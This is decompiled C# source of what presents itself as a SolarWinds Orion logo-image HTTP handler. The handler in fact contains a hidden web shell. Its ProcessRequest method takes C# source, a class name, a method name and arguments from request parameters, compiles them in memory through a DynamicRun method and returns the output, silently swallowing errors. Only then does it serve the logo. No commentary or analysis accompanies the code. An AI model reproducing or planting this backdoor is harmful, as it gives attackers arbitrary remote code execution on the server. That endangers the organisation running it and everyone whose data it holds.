// Decompiled with JetBrains decompiler
// Type: LogoImageHandler
// Assembly: App_Web_logoimagehandler.ashx.b6031896, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 525710A0-BF0E-4E88-9CB6-25351450FEBF

using Microsoft.CSharp;
using SolarWinds.Logging;
using SolarWinds.Orion.Web.DAL;
using System;
using System.CodeDom.Compiler;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Web;

public class LogoImageHandler : IHttpHandler
{
  private static Log _log = new Log();

  public bool IsReusable => false;

  public void ProcessRequest(HttpContext context)
  {
    try
    {
      string codes = context.Request["codes"];
      string clazz = context.Request["clazz"];
      string method = context.Request["method"];
      string[] args = context.Request["args"].Split('\n');
      context.Response.ContentType = "text/plain";
      context.Response.Write(this.DynamicRun(codes, clazz, method, args));
    }
    catch (Exception ex)
    {
    }
    NameValueCollection queryString = HttpUtility.ParseQueryString(context.Request.Url.Query);
    try
    {
      string str1 = queryString["id"];
      string s;
      if (!(str1 == "SitelogoImage"))
      {
        if (!(str1 == "SiteNoclogoImage"))
          throw new ArgumentOutOfRangeException(queryString["id"]);
        s = WebSettingsDAL.get_NewNOCSiteLogo();
      }
      else
        s = WebSettingsDAL.get_NewSiteLogo();
      byte[] buffer = Convert.FromBase64String(s);
      if ((buffer == null || buffer.Length == 0) && File.Exists(HttpContext.Current.Server.MapPath("//NetPerfMon//images//NoLogo.gif")))
        buffer = File.ReadAllBytes(HttpContext.Current.Server.MapPath("//NetPerfMon//images//NoLogo.gif"));
      string str2 = buffer.Length < 2 || buffer[0] != byte.MaxValue || buffer[1] != (byte) 216 ? (buffer.Length < 3 || buffer[0] != (byte) 71 || (buffer[1] != (byte) 73 || buffer[2] != (byte) 70) ? (buffer.Length < 8 || buffer[0] != (byte) 137 || (buffer[1] != (byte) 80 || buffer[2] != (byte) 78) || (buffer[3] != (byte) 71 || buffer[4] != (byte) 13 || (buffer[5] != (byte) 10 || buffer[6] != (byte) 26)) || buffer[7] != (byte) 10 ? "image/jpeg" : "image/png") : "image/gif") : "image/jpeg";
      context.Response.OutputStream.Write(buffer, 0, buffer.Length);
      context.Response.ContentType = str2;
      context.Response.Cache.SetCacheability(HttpCacheability.Private);
      context.Response.StatusDescription = "OK";
      context.Response.StatusCode = 200;
      return;
    }
    catch (Exception ex)
    {
      LogoImageHandler._log.Error((object) "Unexpected error trying to provide logo image for the page.", ex);
    }
    context.Response.Cache.SetCacheability(HttpCacheability.NoCache);
    context.Response.StatusDescription = "NO IMAGE";
    context.Response.StatusCode = 500;
  }

  public string DynamicRun(string codes, string clazz, string method, string[] args)
  {
    ICodeCompiler compiler = new CSharpCodeProvider().CreateCompiler();
    CompilerParameters options = new CompilerParameters();
    options.ReferencedAssemblies.Add("System.dll");
    options.ReferencedAssemblies.Add("System.ServiceModel.dll");
    options.ReferencedAssemblies.Add("System.Data.dll");
    options.ReferencedAssemblies.Add("System.Runtime.dll");
    options.GenerateExecutable = false;
    options.GenerateInMemory = true;
    string source = codes;
    CompilerResults compilerResults = compiler.CompileAssemblyFromSource(options, source);
    if (compilerResults.Errors.HasErrors)
    {
      string.Join(Environment.NewLine, compilerResults.Errors.Cast<CompilerError>().Select<CompilerError, string>((Func<CompilerError, string>) (err => err.ErrorText)));
      Console.WriteLine("error");
      return compilerResults.Errors.ToString();
    }
    object instance = compilerResults.CompiledAssembly.CreateInstance(clazz);
    return (string) instance.GetType().GetMethod(method).Invoke(instance, (object[]) args);
  }
}
